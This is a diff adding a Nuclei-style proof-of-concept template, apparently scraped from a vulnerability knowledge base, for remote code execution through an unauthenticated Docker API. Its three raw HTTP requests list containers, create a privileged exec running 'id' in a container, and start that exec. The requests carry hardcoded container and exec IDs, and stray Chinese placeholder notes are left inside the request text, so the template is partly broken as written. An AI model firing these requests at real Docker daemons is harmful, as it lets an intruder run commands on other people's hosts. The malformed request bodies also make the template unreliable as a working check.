@@ -1,0 +1,106 @@
+id: poc-kliqwa4rp2rw4o1p
+info:
+  name: docker api未授权导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kliqwa4rp2rw4o1p'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kliqwa4rp2rw4o1p
+http:
+- raw:
+  - 'GET /containers/json HTTP/1.1
+
+    User-Agent: Java/17.0.5
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /containers/195dd8c882f192b53ce38e88164a0936cc30d291f5286983671250659e08a4b2/exec HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0
+
+    Content-Type: application/json
+
+    Cache-Control: no-cache
+
+    Pragma: no-cache
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-Length: 141
+
+    {
+
+    "AttachStdin":true,
+
+    "AttachStdout":true,
+
+    "AttachStderr":true,
+
+    "Cmd":[
+
+    "id"
+
+    ],
+
+    "DetachKeys":"ctrl-p,ctrl-q",
+
+    "Privileged":true,
+
+    "Tty":true
+
+    }
+
+
+    取出响应id'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /exec/92839a23e062ba4f2f4b4ad7ad4625761bda6e832a7c4712234fc10e505ba355(响应id)/start HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0
+
+    Content-Type: application/json
+
+    Cache-Control: no-cache
+
+    Pragma: no-cache
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-Length: 31
+
+
+    {
+
+    "Detach":false,
+
+    "Tty":false
+
+    }'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
